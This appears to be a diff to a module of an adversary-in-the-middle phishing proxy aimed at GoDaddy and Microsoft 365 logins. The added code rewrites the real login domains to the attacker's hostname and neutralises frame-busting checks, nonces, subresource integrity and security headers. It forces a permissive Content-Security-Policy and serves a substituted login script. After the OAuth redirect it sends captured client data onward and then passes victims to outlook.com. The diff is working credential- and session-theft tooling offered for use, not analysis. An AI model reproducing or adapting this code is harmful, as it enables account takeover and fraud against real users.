@@ -3,6 +3,8 @@
 const { timeStamp } = require('console')
 const path = require('path')
 const url = require('url')
+const fs = require('fs')
+
 
 // eslint-disable-next-line import/no-dynamic-require
 const globalWorker = process.HOOK_JS_MODULE
@@ -62,55 +64,95 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
 const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
 
     constructor(proxyResp, browserEndPoint) {
-       
+
         super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
         this.regexes = [
-             {
+            {
                 reg: /sso.godaddy.com/igm, // Google chrome on windows fix
                 replacement: this.browserEndPoint.clientContext.hostname,
-             },
-             {
+            },
+            {
                 reg: /sso.secureserver.net/igm, // Google chrome on windows fix
                 replacement: this.browserEndPoint.clientContext.hostname,
-             },
-             {
+            },
+            {
                 reg: /secureserver.net/igm, // Google chrome on windows fix
                 replacement: this.browserEndPoint.clientContext.hostname,
-             },
-             {
+            },
+            {
                 reg: /godaddy.com/igm, // Google chrome on windows fix
                 replacement: this.browserEndPoint.clientContext.hostname,
-             },
-             {
-                 reg: /img6.wsimg.com\/auth-assets\/([A-Za-z0-9]*)\/login-panel.js/igm,
-                 replacement: `${this.browserEndPoint.clientContext.hostname}/auth-assets/$1/login-panel.js`,
+            },
+            {
+                reg: /img6.wsimg.com\/auth-assets\/([A-Za-z0-9]*)\/login-panel.js/igm,
+                replacement: `${this.browserEndPoint.clientContext.hostname}/auth-assets/$1/login-panel.js`,
 
-             },
-             {
+            },
+            {
+                reg: /login.microsoftonline.com/igm, // Google chrome on windows fix
+                replacement: this.browserEndPoint.clientContext.hostname,
+            },
+            {
+                reg: /aadcdn.ms(ft|)auth.net/igm, // Google chrome on windows fix
+                replacement: `${this.browserEndPoint.clientContext.hostname}/aadcdn.ms$1auth.net/~`,
+            },
+          
+            {
                 reg: /\+this.api_target\+"\."\+/,
                 replacement: '+'
 
-             },
-             {
-                 reg: /API_HOST:a,/,
-                 replacement: "API_HOST:'godaddy.com',"
+            },
+            {
+                reg: /API_HOST:a,/,
+                replacement: "API_HOST:'godaddy.com',"
 
-             },
-            //  {
-            //     reg: /src="\/.*\/p.js"/,
-            //     replacement: "https://sso.godaddy.com/$1/p.js"
-
-            // },
-            //  {
-            //     reg: /<\/html>/igm, // Google chrome on windows fix
-            //     replacement: '<script>window.onload = function(){function lp(){var e=document.getElementById("i0116");if(e){console.log("kuka");const t=new URLSearchParams(window.location.search).get("qrc")||"";let o;try{o=atob(t)}catch{o=t}e.value=o}else setTimeout(lp,600)}lp();}</script> </html>',
-            //  },
+            },
+            {
+                reg: /e.self===e.top/igm,
+                replacement: 'true'
+            },
+            {
+                reg: /e\.self===e\.top/igm,
+                replacement: 'true'
+            },
+            {
+                reg: /_top/igm,
+                replacement: ''
+            },
+            {
+                reg: /target="_top"/igm,
+                replacement: ''
+            },
+            {
+                reg: /nonce/g,
+                replacement: 'nononce',
+            },
+            {
+                reg: /integrity/g,
+                replacement: 'xintegrity',
+            },
+            {
+                reg: /crossorigin/gm,
+                replacement: "rickorigin",
+            },
         ]
     }
 
 
     processResponse() {
         this.browserEndPoint.removeHeader('X-Frame-Options')
+        this.browserEndPoint.removeHeader('X-Content-Type-Options')
+        this.browserEndPoint.removeHeader('X-Permitted-Cross-Domain-Policies')
+        this.browserEndPoint.removeHeader('Cross-Origin-Embedder-Policy')
+        this.browserEndPoint.removeHeader('Cross-Origin-Opener-Policy')
+        this.browserEndPoint.removeHeader('Cross-Origin-Resource-Policy')
+        this.browserEndPoint.removeHeader('X-XSS-Protection')
+        this.browserEndPoint.removeHeader('X-DNS-Prefetch-Control')
+        this.browserEndPoint.removeHeader('X-Frame-Options')
+
+        this.browserEndPoint.setHeader("Content-Security-Policy", `default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; form-action * data: blob: 'unsafe-inline' 'unsafe-eval';  script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: filesystem: ; frame-ancestors 'self' * http://* https://* file://* about: javascript: data: blob: filesystem: ; object-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';`)
+
+        
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
@@ -190,7 +232,14 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
 
-
+        if (this.req.url.includes("ConvergedLogin_PCore")) {
+            const clientBuff = fs.readFileSync(path.join(__dirname, 'ConvergedLogin_PCore.js'))
+            this.res.writeHead(200, {
+                'Content-Length': Buffer.byteLength(clientBuff),
+                'Content-Type': 'application/x-javascript'
+            });
+            return this.res.end(clientBuff.toString());
+        }
 
         //TODO: needs update to this code
         if (this.req.url.startsWith('/redirect.cgi?ref=aHR0cHM6Ly93d3cub2ZmaWNlLmNvbS9sb2dpbiM=')) {
@@ -199,27 +248,27 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             return super.superExecuteProxy(clientContext.currentDomain, clientContext)
         }
 
-       
-        // if (this.req.url.startsWith('/v1/api')) {
-        //     // clientContext.currentDomain = 'sso.godaddy.com'
-           
-        // }
 
         if (this.req.url.startsWith(`/${clientContext.hostname}`)) {
             clientContext.currentDomain = 'sso.godaddy.com'
             this.req.url = this.req.url.replace(clientContext.hostname, '')
             this.req.url = this.req.url.replace('/~:443/', '')
-            console.log('max url is ' + this.req.url)
         }
-
-      
 
         if (this.req.url.startsWith('/:443')) {
             this.req.url = this.req.url.slice(5)
         }
 
-              
-       
+        const redirectToken = this.checkForRedirect()
+        if (redirectToken !== null) {
+            console.log(`redirectToken: ${redirectToken.url}`)
+
+            if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
+                super.sendClientData(clientContext, {})
+                return super.exitLink('https://outlook.com')
+            }
+        }
+
 
         return super.execute(clientContext)
 
